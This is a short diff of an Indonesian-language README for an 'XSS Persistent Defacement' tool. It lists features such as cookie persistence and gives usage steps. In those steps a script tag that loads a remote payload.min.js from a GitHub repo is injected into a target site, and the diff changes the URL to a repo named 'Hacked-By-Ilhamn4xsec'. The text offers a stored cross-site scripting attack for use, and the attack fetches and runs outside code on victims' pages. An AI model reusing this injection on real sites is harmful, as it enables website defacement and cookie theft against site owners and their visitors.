@@ -1,5 +1,4 @@
-
-##XSS Persistent Defacement
+##XSS PRESISTENT DEFACEMENT
 
 ## Fitur
 - Cookie persistence
@@ -10,6 +9,6 @@
 - GitHub integration
 
 ## Cara Pakai
-1. Upload file ke GitHub
-2. Inject payload ke target:
-<script src="https://raw.githubusercontent.com/ILHAMN4XSEC/XSS-DEFACER/main/payload.min.js"></script>
+1. Inject payload ke target:
+
+<script src="https://raw.githubusercontent.com/mashamxploit/Hacked-By-Ilhamn4xsec/main/payload.min.js"></script>
